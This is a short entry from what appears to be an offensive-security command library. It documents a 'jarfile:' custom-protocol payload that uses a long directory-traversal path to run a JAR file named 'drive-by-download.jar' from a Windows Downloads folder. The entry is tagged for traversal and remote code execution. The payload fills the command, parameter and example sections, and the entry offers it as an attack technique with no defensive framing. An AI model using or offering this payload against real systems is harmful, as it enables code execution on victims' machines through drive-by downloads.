---
data: >-
  jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar
tags:
  - traversal
  - rce
type: command
executor: bash
platforms:
  - Windows
id: 17eb0955-ee6c-4c20-a860-cd6f5251b859
created_at: '2025-12-11T06:10:17.600Z'
updated_at: '2025-12-11T06:10:17.601Z'
verified: false
validated: true
submitted: true
---
# custom-protocol-jarfile-traversal

## Command

```bash
jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar
```

## Description

Executes a JAR file using directory traversal.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar` | Traversal path | Yes |

## Examples

### Basic Usage

```bash
jarfile:../../../../../../../../../../Users/Username/Downloads/drive-by-download.jar
```

## Expected Output

Runs the JAR file if present.

## Related

- [[commands/custom-protocol-jarfile-path]]
- [[procedures/Explore-Custom-Protocols-and-Directory-Traversal]]
